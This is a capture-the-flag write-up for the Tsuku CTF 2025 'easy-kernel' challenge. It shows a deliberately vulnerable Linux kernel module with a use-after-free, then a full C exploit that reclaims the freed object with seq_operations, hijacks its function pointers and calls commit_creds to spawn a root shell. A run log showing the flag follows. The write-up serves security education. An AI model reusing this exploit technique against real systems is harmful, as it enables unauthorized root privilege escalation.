# easy-kernel
<primary-label ref="pwn"/>

Tsuku CTF 2025

## challenge
```c
#define CMD_ALLOC   0xf000
#define CMD_WRITE   0xf001
#define CMD_FREE    0xf002

#define OBJ_SIZE    0x20

typedef struct {
    size_t size;
    char *data;
} request_t;

struct obj {
    char buf[OBJ_SIZE];
};

static struct obj *obj = NULL;
static DEFINE_MUTEX(module_lock);

static long obj_alloc(void) {
    if (obj != NULL) {
        return -1;
    }
    obj = kzalloc(sizeof(struct obj), GFP_KERNEL);
    if (obj == NULL) {
        return -1;
    }
    return 0;
}

static long obj_write(char *data, size_t size) {
    if (obj == NULL || size > OBJ_SIZE) {
        return -1;
    }
    if (copy_from_user(obj->buf, data, size) != 0) {
        return -1;
    }
    return 0;
}

static long obj_free(void) {
    kfree(obj);
    return 0;
}

static long module_ioctl(struct file *file, unsigned int cmd, unsigned long arg) {
    request_t req;
    long ret;
    if (copy_from_user(&req, (void *)arg, sizeof(req)) != 0) {
        return -1;
    }
    mutex_lock(&module_lock);
    switch(cmd) {
        case CMD_ALLOC:
            ret = obj_alloc();
            break;
        case CMD_WRITE:
            ret = obj_write(req.data, req.size);
            break;
        case CMD_FREE:
            ret = obj_free();
            break;
        default:
            ret = -1;
            break;
    }
    mutex_unlock(&module_lock);
    return ret;
}
```

## summary
There's obvious use-after-free in `obj_free`.
```C
static long obj_free(void) {
    kfree(obj);
    return 0;
}
```
`obj` was allocated by `kzalloc`.
```C
    obj = kzalloc(sizeof(struct obj), GFP_KERNEL);
```
the size of buffer is 0x20 bytes so kernel uses `kmalloc-32`.
```C
#define OBJ_SIZE    0x20
```

Since no validation, no mitigation, I could easily duplicate buffer with `seq_operations`.
```C
struct seq_operations {
	void * (*start) (struct seq_file *m, loff_t *pos);
	void (*stop) (struct seq_file *m, void *v);
	void * (*next) (struct seq_file *m, void *v, loff_t *pos);
	int (*show) (struct seq_file *m, void *v);
};
```
`seq_operations` has 4 function pointers. Use writing function of kernel module to overwrote function pointer and got ip.

Since there was no mitigation such as `kaslr`, `kpti`, `smep` and `smap`, return to userland function that call `commit_cred(init_cred)` and restored the registers.

```C
#!/bin/sh
qemu-system-x86_64 \
    -m 64M \
    -cpu qemu64 \
    -kernel bzImage \
    -drive file=rootfs.ext3,format=raw \
    -drive file=flag.txt,format=raw \
    -snapshot \
    -nographic \
    -monitor /dev/null \
    -no-reboot \
    -smp 1 \
    -append "root=/dev/sda rw init=/init console=ttyS0 nokaslr nopti loglevel=0 oops=panic panic=-1"
```

## exploit
```C
#include <assert.h>
#include <fcntl.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/mman.h>
#include <sys/prctl.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <sys/ioctl.h>
#include <unistd.h>
#include <sys/ipc.h>
#include <sys/msg.h>
#include <stdlib.h>
#include <unistd.h>
#include <errno.h>

#define COLOR_RESET   "\033[0m"
#define COLOR_RED     "\033[0;31m"
#define COLOR_GREEN   "\033[0;32m"
#define COLOR_YELLOW  "\033[0;33m"
#define COLOR_BLUE    "\033[0;34m"
#define COLOR_MAGENTA "\033[0;35m"
#define COLOR_CYAN    "\033[0;36m"

#define PROC_NAME "NKTIDKSG"

#define MODULE_NAME "/dev/vuln"

#define info(fmt, ...) \
    printf(COLOR_CYAN "[*] " fmt COLOR_RESET "\n", ##__VA_ARGS__)

#define success(fmt, ...) \
    printf(COLOR_GREEN "[+] " fmt COLOR_RESET "\n", ##__VA_ARGS__)

#define error(fmt, ...) \
    printf(COLOR_RED "[-] " fmt COLOR_RESET "\n", ##__VA_ARGS__)

#define warning(fmt, ...) \
    printf(COLOR_YELLOW "[!] " fmt COLOR_RESET "\n", ##__VA_ARGS__)


#define CMD_ALLOC   0xf000
#define CMD_WRITE   0xf001
#define CMD_FREE    0xf002

#define OBJ_SIZE    0x20

#define SPRAY 0x1
#define SPRAY_SEQ 0x10

typedef struct {
    size_t size;
    char *data;
} request_t;

void shell() {
    puts("[*] shell");
    char *argv[] = {"/bin/sh", NULL};
    char *envp[] = {NULL};
    execve("/bin/sh", argv, envp);
}

unsigned long ret = 0xffffffff817f2cf3;
//unsigned long pop_rdi = 0xffffffff814f430c;// clc; pop rdi; ret;
unsigned long pop_rdi = 0xffffffff813c9b6d;// clc; pop rdi; ret;
unsigned long iretq = 0xffffffff81639e96;// iretq;
unsigned long swapgs = 0xffffffff817e3408;
unsigned long rip = (unsigned long)shell;

unsigned long cs;
unsigned long ss;
unsigned long rsp;
unsigned long rflags;

unsigned long commit_creds = 0xffffffff812a1050;
unsigned long init_cred = 0xffffffff81e3bfa0;

// readelf -S vmlinux
unsigned long kbase = 0xffffffff81000000;


static void refuge() {
    asm volatile (
        "movq %%cs, %0\n"
        "movq %%ss, %1\n"
        "movq %%rsp, %2\n"
        "pushfq\n"
        "popq %3\n"
        : "=r"(cs), "=r"(ss), "=r"(rsp), "=r"(rflags)
        :
        : "memory");
}

static void ret2user(unsigned long rip) {
    asm volatile ("swapgs\n");
    asm volatile(
        "movq %0, 0x20(%%rsp)\t\n"
        "movq %1, 0x18(%%rsp)\t\n"
        "movq %2, 0x10(%%rsp)\t\n"
        "movq %3, 0x08(%%rsp)\t\n"
        "movq %4, 0x00(%%rsp)\t\n"
        "iretq"
        :
        : "r"(ss),
          "r"(rsp),
          "r"(rflags),
          "r"(cs), "r"(rip));
}

void lpe() {
    //char *(*pkc)(int) = (void *)prepare_kernel_cred;
    void (*cc)(char *) = (void *)commit_creds;
    //(*cc)((*pkc)(0));
    (*cc)((void *)init_cred);
    ret2user((unsigned long)shell);
}


int main(void) { 
    request_t req = {0}; 
    int spray[SPRAY]; 
    info("spray");
    info("spray 1 Alloc");  
    for (int i = 0; i < SPRAY; i++) {
        spray[i] = open(MODULE_NAME, O_RDWR);
        if (spray[i] < 0) {
            error("%d :open %s failed",i, MODULE_NAME);
            exit(1);
        }
        ioctl(spray[i], CMD_ALLOC, &req);
    }

    info("spray 2 Free");  
    for (int i = 0; i < SPRAY; i++) {
        ioctl(spray[i], CMD_FREE, &req);
    }

    info("spray3 Alloc seq_operations");  
    int seq[SPRAY_SEQ];
    for (int i = 0; i < SPRAY_SEQ; i++) {
        seq[i]= open("/proc/self/stat", O_RDONLY);
        if (seq[i] < 0) {
            error("%d :open %s failed",i, "/proc/self/stat");
            exit(1);
        }
    }

    char payload[OBJ_SIZE];
    unsigned long *p = (unsigned long *)payload;
    *p++ = (unsigned long)lpe; 
    *p++ = (unsigned long)lpe; 
    *p++ = (unsigned long)lpe; 
    *p++ = (unsigned long)lpe; 
    req.size = sizeof(payload);
    req.data = payload;

    info("trying to spray uaf.");
    for (int i = 0; i < SPRAY; i++) {
        ioctl(spray[i], CMD_WRITE, &req);
    }

    info("trying to read.");
    char rbuf[0x100];
    info("trying to get RIP.");
    refuge();
    read(seq[0], NULL, 1);

    close(seq[0]);

    return 0;
}
```

gotcha!
```log
/tmp $ ./exploit
./exploit
[*] spray
[*] spray 1 Alloc
[*] spray 2 Free
[*] spray3 Alloc seq_operations
[*] trying to spray uaf.
[*] trying to read.
[*] trying to get RIP.
[*] shell
/tmp # $ dd if=/dev/sdb
dd if=/dev/sdb
TsukuCTF25{n0w_u_learned_h0w_to_turn_UAF_int0_r00t}
\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x001+0 records in
1+0 records out
```
